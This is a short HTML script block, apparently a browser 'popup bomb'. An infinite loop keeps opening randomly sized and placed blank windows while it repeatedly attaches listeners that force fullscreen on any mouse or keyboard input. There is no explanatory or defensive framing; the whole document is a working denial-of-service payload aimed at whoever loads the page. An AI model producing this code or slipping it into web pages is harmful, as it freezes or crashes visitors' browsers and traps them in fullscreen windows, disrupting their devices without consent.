<script>
while(true)
  {
a = Math.random()*768;
b = Math.random()*1366;
c = Math.random()*768;
d = Math.random()*1366;

  window.open("about:blank", "_blank", "width="+d+ ", height="+c+", location = no, resizeable = no, menubar = no, scrollbars = no, fullscreen = yes, popup = no, left = "+ b +", top = " + a);


    function enableFullscreen() {
      var elem = document.documentElement;
      if (elem.requestFullscreen) {
        elem.requestFullscreen();
      } else if (elem.webkitRequestFullscreen) { /* Safari */
        elem.webkitRequestFullscreen();
      } else if (elem.msRequestFullscreen) { /* IE11 */
        elem.msRequestFullscreen();
      }
    }

    // Listen for user interaction
    document.addEventListener("mousemove", enableFullscreen);
    document.addEventListener("click", enableFullscreen);
    document.addEventListener("keydown", enableFullscreen);
  }
</script>
